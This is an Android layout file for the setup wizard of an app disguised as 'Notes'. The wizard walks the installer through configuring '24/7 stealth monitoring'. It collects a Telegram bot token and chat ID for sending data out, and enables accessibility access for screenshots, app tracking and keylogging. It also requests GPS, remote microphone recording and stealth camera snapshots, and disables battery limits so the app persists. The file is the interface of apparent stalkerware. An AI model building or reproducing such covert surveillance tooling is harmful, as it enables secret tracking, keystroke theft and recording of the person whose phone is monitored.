<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF"
    android:padding="24dp">

    <!-- Step Indicator -->
    <TextView
        android:id="@+id/stepText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Step 1/6"
        android:textColor="#999999"
        android:textSize="14sp"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <!-- Content Container -->
    <FrameLayout
        android:id="@+id/wizardContent"
        android:layout_width="0dp"
        android:layout_height="0dp"
        android:layout_marginTop="24dp"
        android:layout_marginBottom="24dp"
        app:layout_constraintBottom_toTopOf="@id/btnNext"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@id/stepText">

        <!-- Welcome Step (Initial) -->
        <LinearLayout
            android:id="@+id/stepWelcome"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:gravity="center_horizontal"
            android:visibility="visible">
            <ImageView
                android:layout_width="120dp"
                android:layout_height="120dp"
                android:src="@mipmap/ic_launcher"
                android:layout_marginTop="48dp"
                android:layout_marginBottom="24dp"/>
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Welcome to Notes"
                android:textSize="28sp"
                android:textStyle="bold"
                android:textColor="#333333"
                android:layout_marginBottom="12dp"/>
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="This setup guide will help you configure the app for 24/7 stealth monitoring. Please follow each step carefully."
                android:gravity="center"
                android:textColor="#666666"
                android:textSize="16sp"/>
        </LinearLayout>

        <!-- Telegram Step -->
        <LinearLayout
            android:id="@+id/stepTelegram"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="1. Connect Telegram"
                android:textSize="24sp"
                android:textStyle="bold"
                android:layout_marginBottom="12dp"/>
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="The app uses a Telegram Bot to send you data securely."
                android:textColor="#666666"
                android:layout_marginBottom="24dp"/>
            
            <com.google.android.material.textfield.TextInputLayout
                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="Bot Token"
                android:layout_marginBottom="12dp">
                <com.google.android.material.textfield.TextInputEditText
                    android:id="@+id/wizardBotToken"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:inputType="textNoSuggestions"/>
            </com.google.android.material.textfield.TextInputLayout>

            <com.google.android.material.textfield.TextInputLayout
                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="Chat ID">
                <com.google.android.material.textfield.TextInputEditText
                    android:id="@+id/wizardChatId"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:inputType="text"/>
            </com.google.android.material.textfield.TextInputLayout>
            
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Instructions:\n1. Create a bot using @BotFather on Telegram.\n2. Get your User ID from @userinfobot.\n3. Paste the Token and ID above."
                android:layout_marginTop="16dp"
                android:textSize="13sp"
                android:textColor="#333333"
                android:lineSpacingExtra="4dp"/>
        </LinearLayout>

        <!-- Accessibility Step -->
        <LinearLayout
            android:id="@+id/stepAccessibility"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="2. Enable Accessibility"
                android:textSize="24sp"
                android:textStyle="bold"
                android:layout_marginBottom="12dp"/>
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Crucial for:\n• Capturing high-quality screenshots\n• Detecting when different apps are opened\n• Keylogging (Text interception)"
                android:textColor="#666666"
                android:lineSpacingExtra="4dp"
                android:layout_marginBottom="24dp"/>
            
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Instructions:\n1. Tap 'OPEN SETTINGS' below.\n2. Go to 'Downloaded Services' or 'Installed Services'.\n3. Find 'Notes' and turn it ON."
                android:textSize="13sp"
                android:textColor="#333333"
                android:layout_marginBottom="24dp"
                android:lineSpacingExtra="4dp"/>

            <com.google.android.material.button.MaterialButton
                android:id="@+id/btnWizardAccessibility"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="OPEN SETTINGS"
                style="@style/Widget.MaterialComponents.Button.OutlinedButton"/>
        </LinearLayout>

        <!-- Permissions Step -->
        <LinearLayout
            android:id="@+id/stepPermissions"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="3. Grant Permissions"
                android:textSize="24sp"
                android:textStyle="bold"
                android:layout_marginBottom="12dp"/>
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="The following permissions are required for full tracking:"
                android:textColor="#666666"
                android:layout_marginBottom="16dp"/>
            
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="• Location: Real-time GPS tracking\n• Microphone: Remote audio recording\n• Camera: Stealth front-camera snapshots"
                android:textColor="#333333"
                android:lineSpacingExtra="4dp"
                android:layout_marginBottom="24dp"/>

            <com.google.android.material.button.MaterialButton
                android:id="@+id/btnWizardPermissions"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="GRANT ALL PERMISSIONS"
                style="@style/Widget.MaterialComponents.Button.OutlinedButton"/>
        </LinearLayout>
        
        <!-- Battery Step -->
        <LinearLayout
            android:id="@+id/stepBattery"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">
            <ScrollView
                android:layout_width="match_parent"
                android:layout_height="wrap_content">
                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="vertical">
                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="4. Background Persistence"
                        android:textSize="24sp"
                        android:textStyle="bold"
                        android:layout_marginBottom="12dp"/>
                    
                    <TextView
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="To prevent the system from killing the app, follow these device-specific instructions:"
                        android:textColor="#666666"
                        android:layout_marginBottom="16dp"/>

                    <TextView
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="ALL PHONES:\n1. Open Battery Settings below.\n2. Find 'Notes'.\n3. Select 'No Restrictions' or 'Don't Optimize'.\n\nXIAOMI / MIUI:\n1. Open Autostart settings below.\n2. Enable 'Autostart' for Notes.\n3. Open Recents menu and 'Lock' the Notes app.\n\nSAMSUNG:\n1. Disable 'Put unused apps to sleep' in Battery settings."
                        android:textSize="13sp"
                        android:textColor="#333333"
                        android:lineSpacingExtra="4dp"
                        android:layout_marginBottom="24dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnWizardBattery"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="OPEN BATTERY SETTINGS"
                        style="@style/Widget.MaterialComponents.Button.OutlinedButton"
                        android:layout_marginBottom="8dp"/>
                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnWizardAutostart"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="OPEN AUTOSTART SETTINGS"
                        style="@style/Widget.MaterialComponents.Button.OutlinedButton"/>
                </LinearLayout>
            </ScrollView>
        </LinearLayout>

        <!-- Completion Step -->
        <LinearLayout
            android:id="@+id/stepDone"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:gravity="center"
            android:visibility="gone">
            <ImageView
                android:layout_width="80dp"
                android:layout_height="80dp"
                android:src="@android:drawable/checkbox_on_background"
                app:tint="#4CAF50"
                android:layout_marginBottom="16dp"/>
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Setup Complete!"
                android:textSize="24sp"
                android:textStyle="bold"
                android:textColor="#333333"/>
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Monitoring will now start automatically. You can close the app now."
                android:layout_marginTop="8dp"
                android:gravity="center"
                android:textColor="#666666"/>
        </LinearLayout>

    </FrameLayout>

    <!-- Navigation Buttons -->
    <com.google.android.material.button.MaterialButton
        android:id="@+id/btnNext"
        android:layout_width="match_parent"
        android:layout_height="56dp"
        android:text="GET STARTED"
        app:cornerRadius="28dp"
        app:layout_constraintBottom_toBottomOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>
